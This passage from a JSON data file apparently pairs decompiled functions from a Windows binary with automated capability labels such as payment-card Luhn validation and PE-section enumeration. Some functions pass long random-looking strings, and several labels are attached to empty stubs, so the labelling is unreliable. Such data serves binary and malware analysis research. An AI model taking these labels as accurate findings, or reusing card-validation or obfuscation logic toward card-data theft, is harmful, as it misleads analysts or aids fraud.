        "decompiled_code": "\nuint __cdecl\nfcn.0041260c(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    return 1;\n}\n",
        "token_count": 153
    },
    "004136e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl\nfcn.004136e0(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint noname_5, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    uint in_ECX;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_3ch;\n    uint var_22h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_ch = 0x41a;\n    var_10h = 0xf17;\n    var_14h = 0xfee;\n    var_18h = 0x699;\n    fcn.00483110();\n    fcn.004b21e0(\"cnccrreimxecrktiacztdfzzynoastqailgpehyxrelzwxvkdtu\", &var_22h);\n    fcn.00483140();\n    var_1ch = 0x1b3;\n    stack0xffffffdc = 0x2e;\n    fcn.00483110();\n    fcn.004b21e0(\"mmuqb\", &var_22h + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 402
    },
    "00417420": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00417420(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    return;\n}\n",
        "token_count": 125
    },
    "00418dcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.00418dcc(uint param_1)\n\n{\n    char *pcVar1;\n    ulong uVar2;\n    uint in_stack_fffffcc4;\n    uint var_2dch;\n    uint var_2cch;\n    uint var_2b1h;\n    uint var_295h;\n    uint var_279h;\n    uint var_260h;\n    uint var_248h;\n    uint var_22dh;\n    uint var_211h;\n    uint var_1f5h;\n    uint var_1d9h;\n    uint var_1bdh;\n    uint var_1a1h;\n    uint var_185h;\n    uint var_16ch;\n    uint var_151h;\n    uint var_135h;\n    uint var_119h;\n    uint var_100h;\n    uint var_e5h;\n    uint var_c9h;\n    uint var_adh;\n    uint var_91h;\n    uint var_75h;\n    uint var_59h;\n    uint var_3dh;\n    uint var_bp_24h;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.00483110();\n    fcn.004b21e0(\"apelr\", &var_2b1h);\n    fcn.00483110();\n    uVar2 = CONCAT44(0x418e65, in_stack_fffffcc4);\n    fcn.004b21e0(\"ciihwnsdqbrabwraxmhjrsybibbtbwvxymzgftshwuuowouuxzylgwcakelzereeelnakdtcqnrdrspjvc\", &var_295h);\n    fcn.00483110(uVar2);\n    fcn.004b21e0(\"cdcetpmntkhglrnkikydgdrsnxigqmjwjfppcfidekemlknztutoaxmdwtwuodrltxo\", &var_279h);\n    fcn.0041836a(*0x522948, *0x522948 >> 0x20, *0x522940, *0x522940 >> 0x20, 0x15ad, &var_295h + 1, *0x522938, \n                 *0x522938 >> 0x20, *0x522930, *0x522930 >> 0x20, &var_2b1h + 1, &var_2cch, 0, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004185b0(param_1, *0x522950, *0x522950 >> 0x20);\n    fcn.004b2800();\n    fcn.00483110();\n    fcn.004b21e0(\"arxzoxlobwuavueppgnbcpwrwccwgc\", &var_22dh);\n    fcn.00483110();\n    fcn.004b21e0(\"dtrhzeylhctbzuuipfliutkwafbmzskhjdilnovkdgfvkqvfgxwnqsinizndvnzzuxagxnhjubuevfq\", &var_211h);\n    fcn.00418644(param_1, 0, &var_22dh + 1, 0, *0x522958, *0x522958 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"tujgepcnilqicogrcamp\", &var_1f5h);\n    fcn.00483110();\n    fcn.004b21e0(\"xvbpufnvsgfhvvrhbn\", &var_1d9h);\n    fcn.00418724();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    pcVar1 = \"ewjbkiebpksl\";\n    fcn.004b21e0();\n    fcn.00483110();\n    uVar2 = CONCAT44(pcVar1, &var_1a1h);\n    pcVar1 = \"vrobrujfmhtjyjmccfajctydvqzzcoglisyitmnjkqghbrfmamudwncvyiogxzxxwwcgjqlxhpsgna\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"kjxuhhmqkpmdugpskttiwugkplqcuukhlcvltvcapmijlaeynqidtsnygpisstiw\", &var_185h, pcVar1, uVar2);\n    fcn.00418ac4(0x2fe, &var_1a1h + 1, &var_1bdh + 1, *0x522970, *0x522970 >> 0x20, *0x522968, *0x522968 >> 0x20, \n                 *0x522960, *0x522960 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00418b20(0x238, 0x3ba, *0x522988, *0x522988 >> 0x20, *0x522980, *0x522980 >> 0x20, 0, *0x522978, \n                 *0x522978 >> 0x20, 0x78c, 1);\n    fcn.00418b88(param_1, *0x5229a0, *0x5229a0 >> 0x20, 0, *0x522998, *0x522998 >> 0x20, *0x522990, *0x522990 >> 0x20);\n    fcn.004b2800();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00417ed2(1, *0x5229a8, *0x5229a8 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"xjcdwtaloawbohwiktnwhxfznzuuittkoagtfovotthphjovjwrconrdqieh\", &var_135h);\n    fcn.00417f30(*0x5229b0, *0x5229b0 >> 0x20, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"wfojjhqlyyftsbdccozrfhvspevibdtzmtzlwxlijqrolfhivirozdsecyqcytsaoqpukjzmxzdkis\", &var_119h);\n    fcn.00417f56(*0x5229c8, *0x5229c8 >> 0x20, *0x5229c0, *0x5229c0 >> 0x20, *0x5229b8, *0x5229b8 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00418072();\n    fcn.00483110();\n    fcn.004b21e0(\"osvimcaxytqrpzqwtbhowkkrj\", &var_e5h);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00418086(param_1, *0x5229f0, *0x5229f0 >> 0x20, *0x5229e8, *0x5229e8 >> 0x20, &var_c9h + 1, *0x5229e0, \n                 *0x5229e0 >> 0x20, &var_e5h + 1, &var_100h, *0x5229d8, *0x5229d8 >> 0x20, 1, *0x5229d0, \n                 *0x5229d0 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00418126(*0x5229f8, *0x5229f8 >> 0x20, 0x220a, 1, 0, 0, 1);\n    fcn.00483110();\n    fcn.004b21e0(\"zfwssyknkscswqrrlfryburyfgirbomuuhnqfbjxmftyjuuphhsayclmgrkphgnktrigbjudxmjqemno\", &var_91h);\n    fcn.00418188(1, 0x194, &var_adh + 1, *0x522a00, *0x522a00 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(0x519e1c, &var_75h);\n    fcn.00483110();\n    fcn.004b21e0(\"rbxzoqbszzspoagfgdgtssleupwbxbbrghuehkwihwyedsrtchjscovg\", &var_59h);\n    fcn.0041824e(&var_75h + 1, 1, 0x524, 0x2057, 0x828, *0x522a10, *0x522a10 >> 0x20, *0x522a08, *0x522a08 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"gucogsbrbdhhkvuadvxolfegtvviulgrdtwtvivwxshpkcqbkckwxeeqyyrbxdytltjfqv\", &var_3dh);\n    fcn.00417e1c(*0x522a18, *0x522a18 >> 0x20, 1, 0x2b7, &var_59h + 1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00417e4a(param_1, *0x522430, *0x522430 >> 0x20, 0, *0x522a28, *0x522a28 >> 0x20, &var_bp_24h, *0x522a20, \n                 *0x522a20 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    return;\n}\n",
        "token_count": 2732
    },
    "0041e068": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041e068(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint noname_5, uint arg_20h, \n            uint noname_7, uint noname_8, uint arg_2ch, uint arg_30h, uint arg_34h, uint arg_38h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    return 1;\n}\n",
        "token_count": 165
    },
    "00426db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00426db0(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch, uint arg_30h, uint arg_34h, uint arg_38h, uint arg_3ch)\n\n{\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_31h;\n    uint var_21h;\n    uint var_14h;\n    \n    return 0x11730;\n}\n",
        "token_count": 218
    },
    "0042d480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0042d480(int32_t param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    \n    // switch table (80 cases) at 0x524ae0\n    switch(param_2) {\n    default:\n        goto code_r0x0042d4ce;\n    case 1:\n    case 2:\n    case 3:\n    case 4:\n    case 0xb:\n    case 0x21:\n    case 0x2b:\n    case 0x2d:\n    case 0x36:\n    case 0x37:\n    case 0x38:\n    case 0x39:\n    case 0x3a:\n    case 0x3c:\n    case 0x3d:\n    case 0x3f:\n    case 0x4b:\n    case 0x4d:\n        if (param_1 == 0) {\n            return NULL;\n        }\n    case 0x2a:\n    case 0x30:\n        if (param_3 == 0) {\n            return NULL;\n        }\n        break;\n    case 9:\n    case 10:\n    case 0xc:\n    case 0xd:\n    case 0xe:\n    case 0xf:\n    case 0x10:\n    case 0x11:\n    case 0x12:\n    case 0x13:\n    case 0x14:\n    case 0x15:\n    case 0x16:\n    case 0x17:\n    case 0x22:\n    case 0x23:\n    case 0x24:\n    case 0x25:\n    case 0x26:\n    case 0x28:\n    case 0x33:\n    case 0x34:\n    case 0x35:\n    case 0x3b:\n    case 0x3e:\n    case 0x42:\n    case 0x43:\n    case 0x44:\n    case 0x48:\n    case 0x49:\n    case 0x4a:\n        if (param_1 == 0) {\n            return NULL;\n        }\n        break;\n    case 0x19:\n    case 0x1a:\n    case 0x1b:\n    case 0x1c:\n    case 0x1d:\n    case 0x1e:\n    case 0x1f:\n    case 0x20:\n    case 0x29:\n    case 0x2e:\n    case 0x2f:\n    case 0x4c:\n    case 0x4e:\n    case 0x4f:\n        break;\n    }\n    iVar1 = *(in_EAX + 0x14);\n    if (iVar1 < *(in_EAX + 0x18)) {\n        puVar2 = iVar1 * 0x10 + *(in_EAX + 0x10);\n        puVar2[1] = 0;\n        *(in_EAX + 0x14) = iVar1 + 1;\n        *puVar2 = param_2;\n        puVar2[3] = param_3;\n        puVar2[2] = param_1;\n        return puVar2;\n    }\ncode_r0x0042d4ce:\n    return NULL;\n}\n",
        "token_count": 756
    },
    "0042d5b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d5b0(int32_t param_1, uchar *param_2)\n\n{\n    uchar *puVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (param_1 != 0) {\n        puVar1 = param_2 + param_1;\n        iVar4 = *(in_EAX + 0x100);\n        do {\n            uVar2 = *param_2;\n            if (iVar4 == 0xff) {\n                *(in_EAX + 0xff) = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar3 = 1;\n                iVar4 = 0;\n            }\n            else {\n                iVar3 = iVar4 + 1;\n            }\n            param_2 = param_2 + 1;\n            *(in_EAX + 0x100) = iVar3;\n            *(in_EAX + iVar4) = uVar2;\n            *(in_EAX + 0x104) = uVar2;\n            iVar4 = iVar3;\n        } while (param_2 != puVar1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "0042d710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.0042d710(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *puVar3;\n    \n    iVar1 = *(in_EAX + 0x14);\n    if (iVar1 < *(in_EAX + 0x18)) {\n        puVar3 = iVar1 * 0x10 + *(in_EAX + 0x10);\n        puVar3[1] = 0;\n        *(in_EAX + 0x14) = iVar1 + 1;\n        *puVar3 = 0x41;\n        uVar2 = fcn.0042d650();\n        puVar3[2] = uVar2;\n        return puVar3;\n    }\n    return NULL;\n}\n",
        "token_count": 174
    },
    "0042d790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.0042d790(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    if (**(in_EAX + 0xc) != 'T') {\n        return NULL;\n    }\n    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n    iVar2 = fcn.0042d750();\n    if ((-1 < iVar2) && (iVar1 = *(in_EAX + 0x14),  iVar1 < *(in_EAX + 0x18))) {\n        puVar3 = *(in_EAX + 0x10) + iVar1 * 0x10;\n        puVar3[1] = 0;\n        *(in_EAX + 0x14) = iVar1 + 1;\n        *puVar3 = 5;\n        puVar3[2] = iVar2;\n        return puVar3;\n    }\n    return NULL;\n}\n",
        "token_count": 227
    },
    "0042e670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042e670(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t aiStack32 [4];\n    \n    aiStack32[0] = 0;\n    piVar3 = aiStack32;\n    if (**(in_EAX + 0xc) == param_2) {\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n        uVar2 = fcn.0042d480(0);\n        return uVar2;\n    }\n    while( true ) {\n        uVar2 = *(in_EAX + 0x30);\n        *(in_EAX + 0x30) = 1;\n        iVar1 = fcn.0042dff0();\n        *(in_EAX + 0x30) = uVar2;\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar1 = fcn.0042d480(0);\n        *piVar3 = iVar1;\n        if (iVar1 == 0) break;\n        piVar3 = iVar1 + 0xc;\n        if (**(in_EAX + 0xc) == param_2) {\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n            return aiStack32[0];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 335
    },
    "0042faf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042faf0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (**(in_EAX + 0xc) == 'J') {\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n    }\n    else if (param_2 == 0) {\n        iVar1 = fcn.0042f7f0();\n        if (iVar1 == 0) {\n            return 0;\n        }\n        goto code_r0x0042fb1b;\n    }\n    iVar1 = fcn.0042ed40();\n    if ((iVar1 == 0) || (iVar1 = fcn.0042f7f0(),  iVar1 == 0)) {\n        return 0;\n    }\ncode_r0x0042fb1b:\n    uVar2 = fcn.0042d480(iVar1);\n    return uVar2;\n}\n",
        "token_count": 230
    },
    "0042fb60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0042fb60(void)\n\n{\n    char *pcVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    pcVar1 = *(in_EAX + 0xc);\n    if (*pcVar1 != 'F') {\n        return 0;\n    }\n    *(in_EAX + 0xc) = pcVar1 + 1;\n    if (pcVar1[1] == 'Y') {\n        *(in_EAX + 0xc) = pcVar1 + 2;\n    }\n    fcn.0042faf0();\n    uVar2 = fcn.0042d4e0();\n    if (**(in_EAX + 0xc) == 'E') {\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 197
    },
    "00435990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00435990(int32_t *param_1, int32_t *param_2)\n\n{\n    uchar *in_EAX;\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uStack32;\n    \n    if (param_2 != NULL) {\n        iVar1 = param_2[2];\n        while (iVar1 == 0) {\n            if (*param_2[1] - 0x19U < 0x13) {\n                uVar4 = 1 << (*param_2[1] - 0x19U & 0x1f);\n                if ((uVar4 & 0x43107) != 0) {\n                    uVar2 = in_EAX[0x104];\n                    iVar1 = *(in_EAX + 0x100);\ncode_r0x00435be1:\n                    iVar3 = iVar1;\n                    if (uVar2 == 0x20) {\ncode_r0x00435b4f:\n                        if (iVar3 != 0xff) goto code_r0x00435b5a;\ncode_r0x00435c12:\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))(in_EAX, 0xff, *(in_EAX + 0x10c));\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar1 = 1;\n                        iVar3 = 0;\n                    }\n                    else {\n                        if (iVar1 == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))(in_EAX, 0xff, *(in_EAX + 0x10c));\n                            *in_EAX = 0x20;\n                            iVar3 = 1;\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        }\n                        else {\n                            iVar3 = iVar1 + 1;\n                            *(in_EAX + 0x100) = iVar3;\n                            in_EAX[iVar1] = 0x20;\n                            in_EAX[0x104] = 0x20;\n                            if (iVar3 == 0xff) goto code_r0x00435c12;\n                        }\ncode_r0x00435b5a:\n                        iVar1 = iVar3 + 1;\n                    }\n                    *(in_EAX + 0x100) = iVar1;\n                    in_EAX[iVar3] = 0x28;\n                    uStack32 = *(in_EAX + 0x114);\n                    in_EAX[0x104] = 0x28;\n                    *(in_EAX + 0x114) = 0;\n                    fcn.00435cc0(0);\n                    iVar1 = *(in_EAX + 0x100);\n                    if (iVar1 != 0xff) {\n                        iVar3 = iVar1 + 1;\n                        *(in_EAX + 0x100) = iVar3;\n                        in_EAX[iVar1] = 0x29;\n                        in_EAX[0x104] = 0x29;\n                        if (iVar3 != 0xff) goto code_r0x00435a2d;\n                        goto code_r0x00435aa0;\n                    }\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))(in_EAX, 0xff, *(in_EAX + 0x10c));\n                    *in_EAX = 0x29;\n                    iVar3 = 1;\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    goto code_r0x00435a2d;\n                }\n                if ((uVar4 & 0xe00) != 0) {\n                    uVar2 = in_EAX[0x104];\n                    iVar1 = *(in_EAX + 0x100);\n                    iVar3 = iVar1;\n                    if ((uVar2 & 0xfd) != 0x28) goto code_r0x00435be1;\n                    goto code_r0x00435b4f;\n                }\n            }\n            param_2 = *param_2;\n            if (param_2 == NULL) break;\n            iVar1 = param_2[2];\n        }\n    }\n    uStack32 = *(in_EAX + 0x114);\n    *(in_EAX + 0x114) = 0;\n    fcn.00435cc0(0);\n    iVar3 = *(in_EAX + 0x100);\n    if (iVar3 == 0xff) {\ncode_r0x00435aa0:\n        in_EAX[0xff] = 0;\n        (**(in_EAX + 0x108))(in_EAX, 0xff, *(in_EAX + 0x10c));\n        *in_EAX = 0x28;\n        in_EAX[0x104] = 0x28;\n        iVar1 = *param_1;\n        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n        *(in_EAX + 0x100) = 1;\n        if (iVar1 != 0) goto code_r0x00435a48;\n        iVar1 = 1;\n    }\n    else {\ncode_r0x00435a2d:\n        iVar1 = iVar3 + 1;\n        *(in_EAX + 0x100) = iVar1;\n        in_EAX[iVar3] = 0x28;\n        in_EAX[0x104] = 0x28;\n        if (*param_1 != 0) {\ncode_r0x00435a48:\n            fcn.004306e0();\n            iVar1 = *(in_EAX + 0x100);\n        }\n        if (iVar1 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))(in_EAX, 0xff, *(in_EAX + 0x10c));\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar3 = 1;\n            iVar1 = 0;\n            goto code_r0x00435a65;\n        }\n    }\n    iVar3 = iVar1 + 1;\ncode_r0x00435a65:\n    *(in_EAX + 0x100) = iVar3;\n    in_EAX[iVar1] = 0x29;\n    in_EAX[0x104] = 0x29;\n    fcn.00435cc0(1);\n    *(in_EAX + 0x114) = uStack32;\n    return;\n}\n",
        "token_count": 1515
    },
    "00436080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00436080(int32_t *param_1, int32_t *param_2)\n\n{\n    uchar *in_EAX;\n    int32_t iVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    \n    if (param_2 != NULL) {\ncode_r0x00436095:\n        if (param_2[2] != 0) goto code_r0x004360a0;\n        if (*param_2[1] != 0x2a) {\n            puVar4 = 0x5257e8;\n            uVar2 = 0x20;\n            iVar3 = *(in_EAX + 0x100);\n            while( true ) {\n                if (iVar3 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar1 = 1;\n                    iVar3 = 0;\n                }\n                else {\n                    iVar1 = iVar3 + 1;\n                }\n                *(in_EAX + 0x100) = iVar1;\n                puVar4 = puVar4 + 1;\n                in_EAX[iVar3] = uVar2;\n                in_EAX[0x104] = uVar2;\n                if (puVar4 == 0x5257ea) break;\n                uVar2 = *puVar4;\n                iVar3 = iVar1;\n            }\n            fcn.00435cc0(0);\n            iVar3 = *(in_EAX + 0x100);\n            if (iVar3 != 0xff) {\n                iVar1 = iVar3 + 1;\n                *(in_EAX + 0x100) = iVar1;\n                in_EAX[iVar3] = 0x29;\n                in_EAX[0x104] = 0x29;\n                goto code_r0x004360c0;\n            }\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *in_EAX = 0x29;\n            iVar1 = 1;\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            goto code_r0x004360cb;\n        }\n        fcn.00435cc0(0);\n        iVar3 = *(in_EAX + 0x100);\n        goto code_r0x004360df;\n    }\ncode_r0x004360ba:\n    iVar1 = *(in_EAX + 0x100);\ncode_r0x004360c0:\n    if (iVar1 == 0xff) {\n        in_EAX[0xff] = 0;\n        (**(in_EAX + 0x108))();\n        *in_EAX = 0x20;\n        iVar3 = 1;\n        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\ncode_r0x004360e7:\n        iVar1 = iVar3 + 1;\n        *(in_EAX + 0x100) = iVar1;\n        in_EAX[iVar3] = 0x5b;\n        in_EAX[0x104] = 0x5b;\n        if (*param_1 != 0) {\ncode_r0x00436101:\n            fcn.004306e0();\n            iVar1 = *(in_EAX + 0x100);\n        }\n        if (iVar1 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar3 = 1;\n            iVar1 = 0;\n            goto code_r0x0043611a;\n        }\n    }\n    else {\ncode_r0x004360cb:\n        iVar3 = iVar1 + 1;\n        *(in_EAX + 0x100) = iVar3;\n        in_EAX[iVar1] = 0x20;\n        in_EAX[0x104] = 0x20;\ncode_r0x004360df:\n        if (iVar3 != 0xff) goto code_r0x004360e7;\n        in_EAX[0xff] = 0;\n        (**(in_EAX + 0x108))();\n        *in_EAX = 0x5b;\n        in_EAX[0x104] = 0x5b;\n        iVar3 = *param_1;\n        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n        *(in_EAX + 0x100) = 1;\n        if (iVar3 != 0) goto code_r0x00436101;\n        iVar1 = 1;\n    }\n    iVar3 = iVar1 + 1;\ncode_r0x0043611a:\n    *(in_EAX + 0x100) = iVar3;\n    in_EAX[iVar1] = 0x5d;\n    in_EAX[0x104] = 0x5d;\n    return;\ncode_r0x004360a0:\n    param_2 = *param_2;\n    if (param_2 == NULL) goto code_r0x004360a6;\n    goto code_r0x00436095;\ncode_r0x004360a6:\n    fcn.00435cc0(0);\n    goto code_r0x004360ba;\n}\n",
        "token_count": 1243
    },
    "00437b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00437b60(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    piVar1 = in_EAX + *(in_EAX + 0x3c);\n    if (*piVar1 != 0x4550) {\n        return false;\n    }\n    return *(piVar1 + 6) == 0x10b;\n}\n",
        "token_count": 88
    },
    "00437c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00437c70(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (*0x400000 != 0x5a4d) {\n        return 0;\n    }\n    iVar1 = fcn.00437b60();\n    if (iVar1 != 0) {\n        iVar1 = *0x40003c + 0x400018 + *(*0x40003c + 0x400014);\n        if (*(*0x40003c + 0x400006) != 0) {\n            uVar2 = 0;\n            do {\n                if ((*(iVar1 + 0xc) <= param_1 - 0x400000U) && (param_1 - 0x400000U < *(iVar1 + 0xc) + *(iVar1 + 8))) {\n                    return iVar1;\n                }\n                uVar2 = uVar2 + 1;\n                iVar1 = iVar1 + 0x28;\n            } while (uVar2 != *(*0x40003c + 0x400006));\n        }\n    }\n    return 0;\n}\n",
        "token_count": 258
    },
    "00437f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
